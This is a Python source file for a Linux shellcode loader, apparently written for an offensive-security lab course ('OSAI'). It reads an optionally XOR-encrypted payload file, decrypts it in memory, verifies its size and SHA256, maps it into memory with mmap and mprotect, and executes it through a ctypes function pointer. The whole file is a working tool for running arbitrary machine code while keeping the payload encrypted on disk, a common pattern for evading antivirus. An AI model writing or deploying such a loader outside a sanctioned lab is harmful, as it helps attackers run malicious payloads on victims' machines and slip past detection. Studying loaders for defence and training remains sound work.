#!/usr/bin/env python3
"""
Linux shellcode loader — OSAI lab use only.

Equivalent of loader.py for Linux targets. Uses mmap/mprotect instead of
VirtualAlloc/VirtualProtect to enforce W^X:

  mmap(RW) → memcpy → mprotect(RX) → execute via ctypes → munmap

Features:
  - W^X memory protection (RW alloc → copy → RX protect, never RWX)
  - Optional XOR decryption in-memory
  - SHA256 checksum verification
  - Configurable execution timeout (SIGALRM)
  - Architecture auto-detection (x86 / x86_64)
  - munmap cleanup in try/finally
  - libc error handling via errno + strerror
"""

import argparse
import ctypes
import ctypes.util
import hashlib
import logging
import os
import platform
import signal
import struct
import sys
from typing import Optional

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PROT_READ  = 0x1
PROT_WRITE = 0x2
PROT_EXEC  = 0x4

MAP_PRIVATE   = 0x02
MAP_ANONYMOUS = 0x20

MAP_FAILED = ctypes.c_void_p(-1).value  # (void *)-1

log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Platform check
# ---------------------------------------------------------------------------

def _check_linux() -> None:
    """Raise RuntimeError when not running on Linux."""
    if sys.platform != "linux":
        raise RuntimeError(
            f"This loader is Linux-only (detected platform: {sys.platform})."
        )


# ---------------------------------------------------------------------------
# Architecture detection
# ---------------------------------------------------------------------------

def _detect_architecture() -> str:
    """Detect the current process architecture and log it.

    Returns:
        'x86_64' or 'x86'.
    """
    bits, _ = platform.architecture()
    arch = "x86_64" if sys.maxsize > 2 ** 32 else "x86"
    log.info("Architecture: %s  (%s Python process).", arch, bits)
    return arch


# ---------------------------------------------------------------------------
# libc helpers
# ---------------------------------------------------------------------------

def _load_libc() -> ctypes.CDLL:
    """Load and configure libc with correct prototypes.

    Returns:
        Configured ctypes.CDLL object for libc.
    """
    libc_name = ctypes.util.find_library("c")
    if libc_name is None:
        raise RuntimeError("Cannot find libc.")

    libc = ctypes.CDLL(libc_name, use_errno=True)

    # mmap
    libc.mmap.restype = ctypes.c_void_p
    libc.mmap.argtypes = [
        ctypes.c_void_p,   # addr
        ctypes.c_size_t,   # length
        ctypes.c_int,      # prot
        ctypes.c_int,      # flags
        ctypes.c_int,      # fd
        ctypes.c_long,     # offset (off_t)
    ]

    # mprotect
    libc.mprotect.restype = ctypes.c_int
    libc.mprotect.argtypes = [
        ctypes.c_void_p,   # addr
        ctypes.c_size_t,   # len
        ctypes.c_int,      # prot
    ]

    # memcpy
    libc.memcpy.restype = ctypes.c_void_p
    libc.memcpy.argtypes = [
        ctypes.c_void_p,   # dest
        ctypes.c_void_p,   # src
        ctypes.c_size_t,   # n
    ]

    # munmap
    libc.munmap.restype = ctypes.c_int
    libc.munmap.argtypes = [
        ctypes.c_void_p,   # addr
        ctypes.c_size_t,   # length
    ]

    # strerror
    libc.strerror.restype = ctypes.c_char_p
    libc.strerror.argtypes = [ctypes.c_int]

    return libc


def _check_errno(call_name: str) -> None:
    """Check ctypes.get_errno() and raise on non-zero.

    Args:
        call_name: Function name used in the error message.

    Raises:
        RuntimeError: When errno is set.
    """
    err = ctypes.get_errno()
    if err != 0:
        libc_tmp = ctypes.CDLL(ctypes.util.find_library("c"))
        libc_tmp.strerror.restype = ctypes.c_char_p
        msg = libc_tmp.strerror(err)
        desc = msg.decode("utf-8", errors="replace") if msg else "Unknown error"
        raise RuntimeError(f"{call_name} failed — errno {err}: {desc}")


# ---------------------------------------------------------------------------
# Shellcode I/O
# ---------------------------------------------------------------------------

def load_shellcode(path: str) -> bytes:
    """Read raw shellcode bytes from a binary file.

    Args:
        path: Filesystem path to the .bin file.

    Returns:
        Shellcode as a bytes object.

    Raises:
        RuntimeError: On I/O error or empty file.
    """
    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except OSError as exc:
        raise RuntimeError(f"Cannot read '{path}': {exc}") from exc

    if not data:
        raise RuntimeError(f"Shellcode file '{path}' is empty.")

    log.debug("Loaded %d byte(s) from '%s'.", len(data), path)
    return data


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

def validate_shellcode(
    data: bytes,
    arch: str,
    expected_checksum: Optional[str] = None,
) -> None:
    """Validate shellcode before execution.

    Checks minimum size (> 20 bytes), architecture heuristic, and optional
    SHA256 digest comparison.

    Args:
        data:              (Decrypted) shellcode bytes.
        arch:              Detected architecture string.
        expected_checksum: Expected SHA256 hex digest, or None to skip.

    Raises:
        RuntimeError: On size check or checksum failure.
    """
    if len(data) <= 20:
        raise RuntimeError(
            f"Shellcode is suspiciously small ({len(data)} byte(s)); "
            "minimum accepted size is 21 bytes."
        )

    if arch == "x86_64" and len(data) < 64:
        log.warning(
            "Payload is only %d bytes — unusually small for x86_64.", len(data),
        )
    elif arch == "x86" and len(data) < 32:
        log.warning(
            "Payload is only %d bytes — unusually small for x86.", len(data),
        )

    actual = hashlib.sha256(data).hexdigest()

    if expected_checksum is not None:
        if actual.lower() != expected_checksum.lower().strip():
            raise RuntimeError(
                "SHA256 mismatch.\n"
                f"  Expected : {expected_checksum.lower().strip()}\n"
                f"  Computed : {actual}"
            )
        log.info("SHA256 verified OK  (%s).", actual)
    else:
        log.debug("SHA256 (unverified): %s", actual)


# ---------------------------------------------------------------------------
# XOR decryption
# ---------------------------------------------------------------------------

def parse_xor_key(raw: str) -> bytes:
    """Parse a hexadecimal XOR key string into bytes.

    Accepts '0xDEADBEEF', 'DEADBEEF', '0xAB', 'AB'.

    Args:
        raw: Hex key from the --key CLI argument.

    Returns:
        Key as a bytes object.

    Raises:
        ValueError: If the string is not valid hex.
    """
    cleaned = raw.strip().lower()
    if cleaned.startswith("0x"):
        cleaned = cleaned[2:]
    if not cleaned:
        raise ValueError(f"XOR key '{raw}' is empty after stripping '0x'.")
    if len(cleaned) % 2:
        cleaned = "0" + cleaned
    try:
        key_bytes = bytes.fromhex(cleaned)
    except ValueError as exc:
        raise ValueError(f"Invalid hex XOR key '{raw}': {exc}") from exc
    log.debug("Parsed XOR key: %s → %d byte(s).", raw, len(key_bytes))
    return key_bytes


def xor_decrypt(data: bytes, key: bytes) -> bytes:
    """XOR-decrypt shellcode in memory using a cyclic key.

    Args:
        data: Encrypted shellcode bytes.
        key:  Key bytes (cycled over the length of data).

    Returns:
        Decrypted shellcode as bytes.
    """
    key_len = len(key)
    out = bytearray(len(data))
    for i, byte in enumerate(data):
        out[i] = byte ^ key[i % key_len]
    log.debug("XOR-decrypted %d byte(s) with %d-byte key.", len(data), key_len)
    return bytes(out)


# ---------------------------------------------------------------------------
# Memory operations (W^X enforced)
# ---------------------------------------------------------------------------

def mem_alloc_rw(libc: ctypes.CDLL, size: int) -> int:
    """Allocate a PROT_READ|PROT_WRITE region via mmap.

    Step 1 of the W^X sequence: writable but not executable.

    Args:
        libc: Configured libc CDLL object.
        size: Number of bytes to allocate.

    Returns:
        Base address as a Python int.

    Raises:
        RuntimeError: On mmap failure.
    """
    ctypes.set_errno(0)
    addr = libc.mmap(
        None,
        size,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0,
    )

    if addr == MAP_FAILED or addr is None or addr == 0:
        _check_errno("mmap")
        raise RuntimeError("mmap returned MAP_FAILED.")

    log.debug("mmap: %d bytes at 0x%016x  [PROT_READ|PROT_WRITE].", size, addr)
    return addr


def mem_write(libc: ctypes.CDLL, addr: int, data: bytes) -> None:
    """Copy shellcode into the RW region via memcpy.

    Step 2 of the W^X sequence.

    Args:
        libc: Configured libc CDLL object.
        addr: Destination address (PROT_READ|PROT_WRITE).
        data: Shellcode bytes to copy.
    """
    src = (ctypes.c_char * len(data)).from_buffer_copy(data)
    libc.memcpy(addr, src, len(data))
    log.debug("memcpy: %d bytes copied to 0x%016x.", len(data), addr)


def mem_protect_rx(libc: ctypes.CDLL, addr: int, size: int) -> None:
    """Change the region from RW to RX via mprotect.

    Step 3: writable bit removed, executable bit added.

    Args:
        libc: Configured libc CDLL object.
        addr: Base address (must be page-aligned from mmap).
        size: Region size in bytes.

    Raises:
        RuntimeError: On mprotect failure.
    """
    ctypes.set_errno(0)
    result = libc.mprotect(addr, size, PROT_READ | PROT_EXEC)
    if result != 0:
        _check_errno("mprotect")
        raise RuntimeError("mprotect failed.")
    log.debug("mprotect: 0x%016x → PROT_READ|PROT_EXEC.", addr)


def mem_free(libc: ctypes.CDLL, addr: int, size: int) -> None:
    """Release the mmap region via munmap.

    Logs a warning rather than raising on failure (called from finally).

    Args:
        libc: Configured libc CDLL object.
        addr: Base address to release.
        size: Region size in bytes.
    """
    result = libc.munmap(addr, size)
    if result == 0:
        log.debug("munmap: released 0x%016x (%d bytes).", addr, size)
    else:
        err = ctypes.get_errno()
        log.warning("munmap failed — errno %d.", err)


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------

class _TimeoutError(Exception):
    """Raised by SIGALRM handler when execution times out."""


def _alarm_handler(signum: int, frame: object) -> None:
    """SIGALRM handler — raises _TimeoutError."""
    raise _TimeoutError("Shellcode execution timed out.")


def exec_shellcode(addr: int, timeout_secs: int) -> None:
    """Cast addr to a function pointer and call it, with optional timeout.

    Uses SIGALRM for the timeout on Linux instead of CreateThread/WaitForSingleObject.

    Args:
        addr:         Shellcode start address (PROT_READ|PROT_EXEC).
        timeout_secs: Max seconds. 0 = no timeout.

    Raises:
        RuntimeError: On timeout.
    """
    func_type = ctypes.CFUNCTYPE(ctypes.c_void_p)
    func = func_type(addr)

    old_handler = None
    if timeout_secs > 0:
        old_handler = signal.signal(signal.SIGALRM, _alarm_handler)
        signal.alarm(timeout_secs)
        log.debug("SIGALRM set: %d second(s).", timeout_secs)

    try:
        log.info("Executing shellcode at 0x%016x …", addr)
        func()
        log.info("Shellcode returned cleanly.")
    except _TimeoutError:
        log.warning(
            "Shellcode timed out after %d second(s). "
            "Increase --timeout if needed.", timeout_secs,
        )
        raise RuntimeError(
            f"Shellcode did not finish within {timeout_secs} second(s)."
        )
    finally:
        if timeout_secs > 0:
            signal.alarm(0)
            if old_handler is not None:
                signal.signal(signal.SIGALRM, old_handler)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _build_parser() -> argparse.ArgumentParser:
    """Build and return the argument parser."""
    p = argparse.ArgumentParser(
        prog="linux_loader.py",
        description=(
            "Linux shellcode loader — OSAI lab use only.\n"
            "Uses mmap/mprotect for W^X, XOR decryption, SHA256 validation."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  linux_loader.py shellcode.bin\n"
            "  linux_loader.py shellcode.bin --key 0xDEADBEEF --verbose\n"
            "  linux_loader.py shellcode.enc --key AB --checksum <sha256> --timeout 60\n"
        ),
    )
    p.add_argument(
        "shellcode_file",
        help="Path to the raw (or XOR-encrypted) shellcode .bin file.",
    )
    p.add_argument(
        "--key", metavar="HEX", default=None,
        help="XOR decryption key as a hex string. Omit for plaintext.",
    )
    p.add_argument(
        "--checksum", metavar="SHA256", default=None,
        help="Expected SHA256 of the shellcode after decryption.",
    )
    p.add_argument(
        "--timeout", type=int, default=30, metavar="SECONDS",
        help="Seconds to wait for shellcode (default: 30; 0 = no timeout).",
    )
    p.add_argument(
        "--verbose", action="store_true",
        help="Enable DEBUG-level log output.",
    )
    return p


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    """Parse arguments, validate, decrypt, execute shellcode."""
    _check_linux()

    parser = _build_parser()
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s  [%(levelname)-8s]  %(message)s",
        datefmt="%H:%M:%S",
    )

    log.info("=== Linux Shellcode Loader — OSAI Lab ===")

    # ── Detect architecture
    arch = _detect_architecture()

    # ── Load raw bytes
    shellcode: bytes = load_shellcode(args.shellcode_file)

    # ── Optional XOR decryption
    if args.key is not None:
        xor_key = parse_xor_key(args.key)
        shellcode = xor_decrypt(shellcode, xor_key)
    else:
        log.debug("No --key supplied — treating payload as plaintext.")

    # ── Validate
    validate_shellcode(shellcode, arch, expected_checksum=args.checksum)
    log.info(
        "Shellcode ready: %d bytes, arch=%s, timeout=%d s.",
        len(shellcode), arch, args.timeout,
    )

    # ── Allocate → Copy → Protect → Execute → Free
    libc = _load_libc()
    mem_addr: Optional[int] = None
    mem_size = len(shellcode)

    try:
        # Step 1 — RW allocation (not yet executable)
        mem_addr = mem_alloc_rw(libc, mem_size)

        # Step 2 — copy shellcode while region is still writable
        mem_write(libc, mem_addr, shellcode)

        # Step 3 — transition to RX
        mem_protect_rx(libc, mem_addr, mem_size)

        # Step 4 — run
        exec_shellcode(mem_addr, args.timeout)

        log.info("Loader finished cleanly.")

    finally:
        # Step 5 — always release memory
        if mem_addr is not None:
            mem_free(libc, mem_addr, mem_size)


if __name__ == "__main__":
    try:
        main()
    except RuntimeError as exc:
        log.error("Fatal: %s", exc)
        sys.exit(1)
    except KeyboardInterrupt:
        log.warning("Interrupted by user (Ctrl+C).")
        sys.exit(130)
